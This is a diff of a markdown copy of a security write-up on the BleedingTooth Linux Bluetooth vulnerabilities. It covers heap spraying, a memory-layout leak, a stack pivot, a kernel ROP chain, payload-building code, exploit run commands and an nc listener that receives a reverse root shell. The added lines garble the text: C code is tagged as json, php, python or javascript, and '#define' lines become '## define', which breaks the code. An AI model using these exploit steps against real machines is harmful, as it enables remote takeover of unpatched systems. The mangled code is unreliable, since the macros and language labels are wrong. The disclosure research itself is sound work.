@@ -10,26 +10,26 @@ _BleedingTooth_ is a set of zero-click vulnerabilities in the Linux Bluetooth su
 
 ### Table of Contents
 
-* [Introduction](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#introduction)
-  * [Patching, Severity and Advisories](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#patching-severity-and-advisories)
-* [Vulnerabilities](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#vulnerabilities)
-  * [BadVibes: Heap-Based Buffer Overflow (CVE-2020-24490)](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#badvibes-heap-based-buffer-overflow-cve-2020-24490)
-  * [BadChoice: Stack-Based Information Leak (CVE-2020-12352)](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#badchoice-stack-based-information-leak-cve-2020-12352)
-  * [BadKarma: Heap-Based Type Confusion (CVE-2020-12351)](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#badkarma-heap-based-type-confusion-cve-2020-12351)
-* [Exploitation](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#exploitation)
-  * [Bypassing BadKarma](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#bypassing-badkarma)
-  * [Exploring sk\_filter()](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#exploring-sk\_filter)
-  * [Finding a Heap Primitive](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#finding-a-heap-primitive)
-  * [Controlling the Out-Of-Bounds Read](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#controlling-the-out-of-bounds-read)
-  * [Leaking the Memory Layout](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#leaking-the-memory-layout)
-  * [Plugging It All Together](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#plugging-it-all-together)
-    * [Achieving RIP Control](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#achieving-rip-control)
-    * [Kernel Stack Pivoting](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#kernel-stack-pivoting)
-    * [Kernel ROP Chain Execution](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#kernel-rop-chain-execution)
-* [Proof-Of-Concept](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#proof-of-concept)
-* [Timeline](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#timeline)
-* [Conclusion](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#conclusion)
-* [Thanks](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#thanks)
+- [Introduction](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#introduction)
+  - [Patching, Severity and Advisories](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#patching-severity-and-advisories)
+- [Vulnerabilities](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#vulnerabilities)
+  - [BadVibes: Heap-Based Buffer Overflow (CVE-2020-24490)](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#badvibes-heap-based-buffer-overflow-cve-2020-24490)
+  - [BadChoice: Stack-Based Information Leak (CVE-2020-12352)](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#badchoice-stack-based-information-leak-cve-2020-12352)
+  - [BadKarma: Heap-Based Type Confusion (CVE-2020-12351)](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#badkarma-heap-based-type-confusion-cve-2020-12351)
+- [Exploitation](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#exploitation)
+  - [Bypassing BadKarma](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#bypassing-badkarma)
+  - [Exploring sk\_filter()](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#exploring-sk\_filter)
+  - [Finding a Heap Primitive](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#finding-a-heap-primitive)
+  - [Controlling the Out-Of-Bounds Read](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#controlling-the-out-of-bounds-read)
+  - [Leaking the Memory Layout](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#leaking-the-memory-layout)
+  - [Plugging It All Together](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#plugging-it-all-together)
+    - [Achieving RIP Control](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#achieving-rip-control)
+    - [Kernel Stack Pivoting](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#kernel-stack-pivoting)
+    - [Kernel ROP Chain Execution](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#kernel-rop-chain-execution)
+- [Proof-Of-Concept](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#proof-of-concept)
+- [Timeline](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#timeline)
+- [Conclusion](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#conclusion)
+- [Thanks](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#thanks)
 
 ### Introduction
 
@@ -43,8 +43,8 @@ This blogpost describes the process of me diving into the code, uncovering high 
 
 Google reached out directly to [BlueZ](http://www.bluez.org/) and the Linux Bluetooth Subsystem maintainers (Intel), rather than to the Linux Kernel Security team in order to coordinate the multi-party response for this series of vulnerabilities. Intel issued the security advisory [INTEL-SA-00435](https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00435.html) with the patches, but these weren’t included in any released Kernel versions at the time of disclosure. The Linux Kernel Security team should have been notified in order to facilitate coordination, and any future vulnerabilities of this type will also be reported to them. A timeline of the communications is at the bottom of this post. The patches for the respective vulnerabilities are:
 
-* [BadVibes](https://github.com/google/security-research/security/advisories/GHSA-ccx2-w2r4-x649) (CVE-2020-24490) was fixed on the mainline branch on 2020-Jul-30: [commit](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=a2ec905d1e160a33b2e210e45ad30445ef26ce0e).
-* [BadChoice](https://github.com/google/security-research/security/advisories/GHSA-7mh3-gq28-gfrq) (CVE-2020-12352) and [BadKarma](https://github.com/google/security-research/security/advisories/GHSA-h637-c88j-47wq) (CVE-2020-12351) were fixed on bluetooth-next on 2020-Sep-25: commits [1](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=eddb7732119d53400f48a02536a84c509692faa8), [2](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=f19425641cb2572a33cb074d5e30283720bd4d22), [3](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=b176dd0ef6afcb3bca24f41d78b0d0b731ec2d08), [4](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=b560a208cda0297fef6ff85bbfd58a8f0a52a543)
+- [BadVibes](https://github.com/google/security-research/security/advisories/GHSA-ccx2-w2r4-x649) (CVE-2020-24490) was fixed on the mainline branch on 2020-Jul-30: [commit](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=a2ec905d1e160a33b2e210e45ad30445ef26ce0e).
+- [BadChoice](https://github.com/google/security-research/security/advisories/GHSA-7mh3-gq28-gfrq) (CVE-2020-12352) and [BadKarma](https://github.com/google/security-research/security/advisories/GHSA-h637-c88j-47wq) (CVE-2020-12351) were fixed on bluetooth-next on 2020-Sep-25: commits [1](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=eddb7732119d53400f48a02536a84c509692faa8), [2](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=f19425641cb2572a33cb074d5e30283720bd4d22), [3](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=b176dd0ef6afcb3bca24f41d78b0d0b731ec2d08), [4](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=b560a208cda0297fef6ff85bbfd58a8f0a52a543)
 
 Alone, the severity of these vulnerabilities **vary from medium to high, but combined they represent a serious security risk.** This write-up goes over these risks.
 
@@ -52,9 +52,9 @@ Alone, the severity of these vulnerabilities **vary from medium to high, but com
 
 Let’s briefly describe the Bluetooth stack. The Bluetooth chip communicates with the host (the operating system) using the HCI (Host Controller Interface) protocol. Common packets are:
 
-* Command packets – Sent by the host to the controller.
-* Event packets – Sent by the controller to the host to notify about events.
-* Data packets – Usually carry L2CAP (Logical Link Control and Adaptation protocol) packets, which implement the transport layer.
+- Command packets – Sent by the host to the controller.
+- Event packets – Sent by the controller to the host to notify about events.
+- Data packets – Usually carry L2CAP (Logical Link Control and Adaptation protocol) packets, which implement the transport layer.
 
 Higher-level protocols such as A2MP (AMP Manager Protocol) or SMP (Security Management Protocol) are built on top of L2CAP. In the Linux implementation, all these protocols are exposed without authentication, and vulnerabilities there are crucial since some of these protocols even live inside the kernel.
 
@@ -62,7 +62,7 @@ Higher-level protocols such as A2MP (AMP Manager Protocol) or SMP (Security Mana
 
 I discovered the first vulnerability (introduced in Linux kernel 4.19) by manually reviewing the HCI event packet parsers. HCI event packets are crafted and sent by the Bluetooth chip and usually cannot be controlled by attackers (unless they have control over the Bluetooth firmware as well). However, there are two very similar methods, `hci_le_adv_report_evt()` and `hci_le_ext_adv_report_evt()`, whose purposes are to parse advertisement reports coming from remote Bluetooth devices. These reports are variable in size.
 
-```
+```json
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/hci_event.c
 static void hci_le_adv_report_evt(struct hci_dev *hdev, struct sk_buff *skb)
 {
@@ -119,7 +119,7 @@ static void hci_le_ext_adv_report_evt(struct hci_dev *hdev, struct sk_buff *skb)
 
 Notice how both methods call `process_adv_report()`, but the latter method does not check `ev->length` to see if it is smaller or equal to `HCI_MAX_AD_LENGTH=31`. The function `process_adv_report()` then invokes `store_pending_adv_report()` with the event data and length:
 
-```
+```json
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/hci_event.c
 static void process_adv_report(struct hci_dev *hdev, u8 type, bdaddr_t *bdaddr,
 			       u8 bdaddr_type, bdaddr_t *direct_addr,
@@ -141,7 +141,7 @@ static void process_adv_report(struct hci_dev *hdev, u8 type, bdaddr_t *bdaddr,
 
 Finally, the `store_pending_adv_report()` subroutine copies the data into `d->last_adv_data`:
 
-```
+```json
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/hci_event.c
 static void store_pending_adv_report(struct hci_dev *hdev, bdaddr_t *bdaddr,
 				     u8 bdaddr_type, s8 rssi, u32 flags,
@@ -188,7 +188,7 @@ Therefore, this vulnerability is only triggerable if the victim’s machine has 
 
 Using two Bluetooth 5-capable devices, we can easily confirm the vulnerability and observe a panic similar to:
 
-```
+```json
 [  118.490999] general protection fault: 0000 [#1] SMP PTI
 [  118.491006] CPU: 6 PID: 205 Comm: kworker/u17:0 Not tainted 5.4.0-37-generic #41-Ubuntu
 [  118.491008] Hardware name: Dell Inc. XPS 15 7590/0CF6RR, BIOS 1.7.0 05/11/2020
@@ -225,7 +225,7 @@ Using two Bluetooth 5-capable devices, we can easily confirm the vulnerability a
 
 The panic shows that we can take full control over members within `struct hci_dev`. An interesting pointer to corrupt is `mgmt_pending->next`, as it is of the type `struct mgmt_pending_cmd` which contains the function pointer `cmd_complete()`:
 
-```
+```php
 // pahole -E -C mgmt_pending_cmd --hex bluetooth.ko
 struct mgmt_pending_cmd {
 	...
@@ -248,7 +248,7 @@ I discovered the second vulnerability in the command `A2MP_GETINFO_REQ` of the A
 
 Let’s take a look at the subroutine `a2mp_getinfo_req()` invoked by the `A2MP_GETINFO_REQ` command:
 
-```
+```json
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c
 static int a2mp_getinfo_req(struct amp_mgr *mgr, struct sk_buff *skb,
 			    struct a2mp_cmd *hdr)
@@ -297,7 +297,7 @@ Note that kernels compiled with `CONFIG_INIT_STACK_ALL_PATTERN=y` should not be 
 
 I discovered the third vulnerability while attempting to trigger _BadChoice_ and confirm its exploitability. Namely, the victim’s machine unexpectedly crashed with the following call trace:
 
-```
+```json
 [  445.440736] general protection fault: 0000 [#1] SMP PTI
 [  445.440740] CPU: 4 PID: 483 Comm: kworker/u17:1 Not tainted 5.4.0-40-generic #44-Ubuntu
 [  445.440741] Hardware name: Dell Inc. XPS 15 7590/0CF6RR, BIOS 1.7.0 05/11/2020
@@ -331,7 +331,7 @@ I discovered the third vulnerability while attempting to trigger _BadChoice_ and
 
 Taking a look at `l2cap_data_rcv()`, we can see that `sk_filter()` is invoked when ERTM (Enhanced Retransmission Mode) or streaming mode is used (similar to TCP):
 
-```
+```json
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c
 static int l2cap_data_rcv(struct l2cap_chan *chan, struct sk_buff *skb)
 {
@@ -345,7 +345,7 @@ static int l2cap_data_rcv(struct l2cap_chan *chan, struct sk_buff *skb)
 
 This is indeed the case for the A2MP channel (channels can be compared with network ports):
 
-```
+```json
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c
 static struct l2cap_chan *a2mp_chan_open(struct l2cap_conn *conn, bool locked)
 {
@@ -389,9 +389,9 @@ Looking at `amp_mgr_create()`, it is clear where the mistake is. Namely, `chan->
 
 The _BadChoice_ vulnerability can be chained with _BadVibes_ as well as _BadKarma_ to achieve RCE. In this blogpost, we will only focus on the method using _BadKarma_, for the following reasons:
 
-* It is not limited to Bluetooth 5.
-* It does not require the victim to be scanning.
-* It is possible to perform a targeted attack on a specific device.
+- It is not limited to Bluetooth 5.
+- It does not require the victim to be scanning.
+- It is possible to perform a targeted attack on a specific device.
 
 The _BadVibes_ attack, on the other hand, is a broadcast only, thus only one machine could be successfully exploited while all other machines listening to the same message would simply crash.
 
@@ -401,7 +401,7 @@ Ironically, in order to exploit _BadKarma_, we must first get rid of _BadKarma_.
 
 Looking at `l2cap_data_channel()`, we can see that the only possible way to take a different route is to reconfigure the channel mode to `L2CAP_MODE_BASIC`. This would “basically” allow us to invoke the A2MP receive handler directly:
 
-```
+```json
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c
 static void l2cap_data_channel(struct l2cap_conn *conn, u16 cid,
 			       struct sk_buff *skb)
@@ -444,7 +444,7 @@ However, is the reconfiguration of the channel mode even possible? According to 
 
 For some reason, this fact is not described in the specification and the implementation of Linux actually allows us to switch from any channel mode to `L2CAP_MODE_BASIC` by encapsulating the desired channel mode in the `L2CAP_CONF_UNACCEPT` configuration response:
 
-```
+```json
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c`
 static inline int l2cap_config_rsp(struct l2cap_conn *conn,
 				   struct l2cap_cmd_hdr *cmd, u16 cmd_len,
@@ -479,7 +479,7 @@ static inline int l2cap_config_rsp(struct l2cap_conn *conn,
 
 This function invokes the subroutine `l2cap_parse_conf_rsp()`. There, if the option type `L2CAP_CONF_RFC` is specified, and the current channel mode is not `L2CAP_MODE_BASIC`, it is possible to change it to our desire:
 
-```
+```json
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c
 static int l2cap_parse_conf_rsp(struct l2cap_chan *chan, void *rsp, int len,
 				void *data, size_t size, u16 *result)
@@ -520,7 +520,7 @@ As we understand, the issue of _BadKarma_ is that a `struct amp_mgr` object is p
 
 Can we control that pointer dereference, or control other members in `struct amp_mgr` in order to affect the code-flow of `sk_filter()`? Let’s take a look at `sk_filter()` and track the usage of `struct sock *sk` to understand what members are relevant in this subroutine.
 
-```
+```php
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/filter.h
 static inline int sk_filter(struct sock *sk, struct sk_buff *skb)
 {
@@ -568,9 +568,9 @@ int sk_filter_trim_cap(struct sock *sk, struct sk_buff *skb, unsigned int cap)
 
 The first usage of `sk` is in `sock_flag()`, though that function simply checks for some flags and moreover, only occurs if `skb_pfmemalloc()` returns true. Instead, let’s take a look at `BPF_CGROUP_RUN_PROG_INET_INGRESS()` and see what it does with the socket structure:
 
-```
+```json
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/bpf-cgroup.h
-#define BPF_CGROUP_RUN_PROG_INET_INGRESS(sk, skb)			      \
+## define BPF_CGROUP_RUN_PROG_INET_INGRESS(sk, skb)			      \
 ({									      \
 	int __ret = 0;							      \
 	if (cgroup_bpf_enabled)						      \
@@ -634,13 +634,13 @@ As this is a pointer to a heap object which is aligned to the allocation size (m
 
 This leaves us with `sk->sk_filter` as the only potential member to corrupt. We will later see how it may be useful to have control over `struct sk_filter`, but first, note that `sk_filter` is located at offset 0x110, whereas the size of `struct amp_mgr` is only 112=0x70 bytes wide. Is it not out of our control then? Yes and no – usually it is not in our control, however if we have a way to shape the heap, then it may be even easier to take full control over the pointer. To elaborate, the `struct amp_mgr` has a size of 112 bytes (between 65 and 128), thus it is allocated within the kmalloc-128 slab. Usually, memory blocks in the slab do not contain metadata such as chunk headers in front, as the goal is to minimize fragmentation. As such, memory blocks are consecutive and therefore, in order to control the pointer at offset 0x110, we must achieve a heap constellation where our desired pointer is located at offset 0x10 of the second block after `struct amp_mgr`.
 
-#### Finding a Heap Primitive
+### Finding a Heap Primitive
 
 In order to shape the kmalloc-128 slab, we need a command that can allocate (preferably controllable) memory with a size between 65-128 bytes. Unlike other L2CAP implementations, the usage of the heap in the Linux implementation is quite low. A quick search for `kmalloc()` or `kzalloc()` in `net/bluetooth/` yields nothing useful – or at least nothing that can be controlled or exist across multiple commands. What we would like to have is a primitive that can allocate memory of arbitrary size, copy attacker-controlled data into it, and leave it around until we decide to free it.
 
 This sounds pretty much like `kmemdup()`, right? Surprisingly, the A2MP protocol offers us exactly such a primitive. Namely, we can issue a `A2MP_GETAMPASSOC_RSP` command to duplicate memory using `kmemdup()` and store the memory address within a control structure:
 
-```
+```json
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c
 static int a2mp_getampassoc_rsp(struct amp_mgr *mgr, struct sk_buff *skb,
 				struct a2mp_cmd *hdr)
@@ -673,7 +673,7 @@ static int a2mp_getampassoc_rsp(struct amp_mgr *mgr, struct sk_buff *skb,
 
 In order for `amp_ctrl_lookup()` to return a control structure, we must first add it into the list using the `A2MP_GETINFO_RSP` command:
 
-```
+```json
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c
 static int a2mp_getinfo_rsp(struct amp_mgr *mgr, struct sk_buff *skb,
 			    struct a2mp_cmd *hdr)
@@ -699,10 +699,10 @@ The following basic technique works quite reliably on Ubuntu which uses the SLUB
 
 To verify that our heap spray was successful, we can first query `/proc/slabinfo` for information about kmalloc-128 on the victim’s machine:
 
-```
+```php
 $ sudo cat /proc/slabinfo
 slabinfo - version: 2.1
-# name            <active_objs> <num_objs> <objsize> <objperslab> <pagesperslab> : tunables <limit> <batchcount> <sharedfactor> : slabdata <active_slabs> <num_slabs> <sharedavail>
+## name            <active_objs> <num_objs> <objsize> <objperslab> <pagesperslab> : tunables <limit> <batchcount> <sharedfactor> : slabdata <active_slabs> <num_slabs> <sharedavail>
 ...
 kmalloc-128         1440   1440    128   32    1 : tunables    0    0    0 : slabdata     45     45      0
 ...
@@ -710,7 +710,7 @@ kmalloc-128         1440   1440    128   32    1 : tunables    0    0    0 : sla
 
 Then, after the heap spray, we can query once again and find that `active_objs` increased:
 
-```
+```php
 $ sudo cat /proc/slabinfo
 ...
 kmalloc-128         1760   1760    128   32    1 : tunables    0    0    0 : slabdata     55     55      0
@@ -719,7 +719,7 @@ kmalloc-128         1760   1760    128   32    1 : tunables    0    0    0 : sla
 
 In the example above, we sprayed 320 objects. Now, if we manage to allocate the `struct amp_mgr` object in the surrounding of these newly sprayed objects, we may hit a panic trying to dereference a controlled pointer (observe the value of RAX):
 
-```
+```json
 [   58.881623] general protection fault: 0000 [#1] SMP PTI
 [   58.881639] CPU: 3 PID: 568 Comm: kworker/u9:1 Not tainted 5.4.0-48-generic #52-Ubuntu
 [   58.881645] Hardware name: Acer Aspire E5-575/Ironman_SK  , BIOS V1.04 04/26/2016
@@ -753,7 +753,7 @@ In the example above, we sprayed 320 objects. Now, if we manage to allocate the 
 
 Inspecting the memory address at RDI of the victim’s machine, we can see:
 
-```
+```php
 $ sudo gdb /boot/vmlinuz /proc/kcore
 (gdb) x/40gx 0xffff96da38f70300
 0xffff96da38f70300:	0xffff96da601e7d00	0xffffffffc0d38760
@@ -780,7 +780,7 @@ $ sudo gdb /boot/vmlinuz /proc/kcore
 
 The value at `0xffff96da38f70410` shows that `sk_filter()` indeed tried to dereference the pointer at offset 0x10 of our spray, which, from the perspective of `struct amp_mgr`, is at offset 0x110. Bingo!
 
-#### Leaking the Memory Layout
+### Leaking the Memory Layout
 
 Now we have a way to shape the heap and prepare it for the _BadKarma_ attack, and as such, have full control over the `sk_filter` pointer. The question is, where shall we point it to? In order to make that primitive useful, we must point it to a memory address whose content we can control. That is where the _BadChoice_ vulnerability comes into play. This vulnerability has the potential to disclose the memory layout and aid us in achieving the goal of controlling a memory block whose address we also know.
 
@@ -822,14 +822,14 @@ In other words, the address that belonged to `struct l2cap_chan` may now belong 
 
 Note that allocating objects in the kmalloc-1024 slab is a bit more complicated than the kmalloc-128 slab, because:
 
-* The ACL MTU is usually smaller than 1024 bytes (can be checked with `hciconfig`).
-* The default MTU for the A2MP channel is `L2CAP_A2MP_DEFAULT_MTU=670` bytes.
+- The ACL MTU is usually smaller than 1024 bytes (can be checked with `hciconfig`).
+- The default MTU for the A2MP channel is `L2CAP_A2MP_DEFAULT_MTU=670` bytes.
 
 Both MTU limitations are easy to bypass. Namely, we can bypass the ACL MTU by fragmenting the request into multiple L2CAP packets, and we can bypass the A2MP MTU by sending a `L2CAP_CONF_MTU` response and configuring it to 0xffff bytes. Here again, it is unclear why the Bluetooth specification does not explicitly disallow parsing configuration responses if no request has been sent.
 
 Let’s try out the technique:
 
-```
+```php
 $ gcc -o exploit exploit.c -lbluetooth && sudo ./exploit XX:XX:XX:XX:XX:XX
 [*] Opening hci device...
 [*] Connecting to victim...
@@ -846,7 +846,7 @@ $ gcc -o exploit exploit.c -lbluetooth && sudo ./exploit XX:XX:XX:XX:XX:XX
 
 Notice how the most significant bytes of both leaked pointers differ. By observing the higher bytes, we can make an educated guess (or check the Linux documentation) to determine whether they belong to a segment, heap, or stack. To confirm that we were indeed able to reclaim the address of `struct l2cap_chan`, we can inspect the memory on the victim’s machine using:
 
-```
+```php
 $ sudo gdb /boot/vmlinuz /proc/kcore
 (gdb) x/40gx 0xffff98ee5c62fc00
 0xffff98ee5c62fc00:	0x4141414141414141	0x4242424242424242
@@ -874,7 +874,7 @@ We now have all primitives we need to complete our RCE:
 
 Let’s take a look back at `sk_filter_trim_cap()`, and understand why having control over `sk_filter` is beneficial.
 
-```
+```json
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/core/filter.c
 int sk_filter_trim_cap(struct sock *sk, struct sk_buff *skb, unsigned int cap)
 {
@@ -898,7 +898,7 @@ int sk_filter_trim_cap(struct sock *sk, struct sk_buff *skb, unsigned int cap)
 
 Since we control the value of `filter`, we can also control `filter->prog` by placing a pointer at offset 0x18 in our payload. Namely, this is the offset of `prog`:
 
-```
+```javascript
 // pahole -E -C sk_filter --hex bluetooth.ko
 struct sk_filter {
 	...
@@ -913,7 +913,7 @@ struct sk_filter {
 
 Here, the structure of `struct buf_prog` is:
 
-```
+```javascript
 // pahole -E -C bpf_prog --hex bluetooth.ko
 struct bpf_prog {
 	...
@@ -938,7 +938,7 @@ struct bpf_prog {
 
 The function `bpf_prog_run_save_cb()` then passes `filter->prog` to `BPF_PROG_RUN()`:
 
-```
+```javascript
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/filter.h
 static inline u32 __bpf_prog_run_save_cb(const struct bpf_prog *prog,
 					 struct sk_buff *skb)
@@ -963,9 +963,9 @@ static inline u32 bpf_prog_run_save_cb(const struct bpf_prog *prog,
 
 That in turn calls `bpf_dispatcher_nop_func()` with `ctx`, `prog->insnsi` and `prog->bpf_func()` as parameters:
 
-```
+```bash
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/filter.h
-#define __BPF_PROG_RUN(prog, ctx, dfunc)	({			\
+## define __BPF_PROG_RUN(prog, ctx, dfunc)	({			\
 	u32 ret;							\
 	cant_migrate();							\
 	if (static_branch_unlikely(&bpf_stats_enabled_key)) {		\
@@ -977,13 +977,13 @@ That in turn calls `bpf_dispatcher_nop_func()` with `ctx`, `prog->insnsi` and `p
 	}								\
 	ret; })
 
-#define BPF_PROG_RUN(prog, ctx)						\
+## define BPF_PROG_RUN(prog, ctx)						\
 	__BPF_PROG_RUN(prog, ctx, bpf_dispatcher_nop_func)
 ```
 
 Finally, the dispatcher calls the `prog->bpf_func()` handler with `ctx` and `prog->insnsi` as arguments:
 
-```
+```javascript
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/bpf.h
 static __always_inline unsigned int bpf_dispatcher_nop_func(
 	const void *ctx,
@@ -997,7 +997,7 @@ static __always_inline unsigned int bpf_dispatcher_nop_func(
 
 All in all, we have:
 
-```
+```bash
 sk->sk_filter->prog->bpf_func(skb, sk->sk_filter->prog->insnsi);
 ```
 
@@ -1011,8 +1011,8 @@ The idea is to redirect the stack pointer to a fake stack in our payload consist
 
 To extract the gadgets, we can use the following tools:
 
-* [extract-vmlinux](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/scripts/extract-vmlinux) to decompress `/boot/vmlinuz`.
-* [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) to extract ROP gadgets from `vmlinux`.
+- [extract-vmlinux](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/scripts/extract-vmlinux) to decompress `/boot/vmlinuz`.
+- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) to extract ROP gadgets from `vmlinux`.
 
 Looking for gadgets like `mov rsp, X ; ret`, we can see that none of them are useful.
 
@@ -1039,7 +1039,7 @@ Perfect, there are lots of gadgets that can be used. Interestingly, all gadgets 
 
 When choosing the stack pivot gadget as a function pointer for `bpf_func()` and triggering it, the value of RSI will be pushed onto stack, then popped from stack and finally assigned to RSP. In other words, the stack pointer will point to our payload, and once the `RET` instruction is executed, our ROP chain will kick off.
 
-```
+```python
 static void build_payload(uint8_t data[0x400]) {
   // Fake sk_filter object starting at offset 0x300.
   *(uint64_t *)&data[0x318] = l2cap_chan_addr + 0x320;  // prog
@@ -1067,7 +1067,7 @@ Now, we can either write a big ROP chain that retrieves and executes a C payload
 
 To determine offsets for both methods, we can simply inspect the live symbols on the victim’s machine:
 
-```
+```python
 $ sudo cat /proc/kallsyms | grep "run_cmd\|do_task_dead"
 ffffffffab2ce470 t run_cmd
 ffffffffab2dc260 T do_task_dead
@@ -1075,7 +1075,7 @@ ffffffffab2dc260 T do_task_dead
 
 Here, the KASLR slide is 0x2a200000 which can be calculated by grep’ing for the `_text` symbol and subtracting `0xffffffff81000000`:
 
-```
+```python
 $ sudo cat /proc/kallsyms | grep "T _text"
 ffffffffab200000 T _text
 ```
@@ -1083,13 +1083,13 @@ ffffffffab200000 T _text
 Subtracting the slide from the two addresses from before yields:
 
 ```
-#define RUN_CMD 0xffffffff810ce470
-#define DO_TASK_DEAD 0xffffffff810dc260
+## define RUN_CMD 0xffffffff810ce470
+## define DO_TASK_DEAD 0xffffffff810dc260
 ```
 
 Finally, we can find gadgets for `pop rax ; ret`, `pop rdi ; ret` and `jmp rax` with ROPgadget and then we can construct the kernel ROP chain according to this example:
 
-```
+```python
 static void build_krop_chain(uint64_t *rop, uint64_t cmd_addr) {
   *rop++ = kaslr_offset + POP_RAX_RET;
   *rop++ = kaslr_offset + RUN_CMD;
@@ -1110,26 +1110,26 @@ The Proof-Of-Concept is available at [https://github.com/google/security-researc
 
 Compile it using:
 
-```
+```php
 $ gcc -o exploit exploit.c -lbluetooth
 ```
 
 and execute it as:
 
-```
+```php
 $ sudo ./exploit target_mac source_ip source_port
 ```
 
 In another terminal, run:
 
-```
+```php
 $ nc -lvp 1337
 exec bash -i 2>&0 1>&0
 ```
 
 If successful, a calc can be spawned with:
 
-```
+```javascript
 export XAUTHORITY=/run/user/1000/gdm/Xauthority
 export DISPLAY=:0
 gnome-calculator
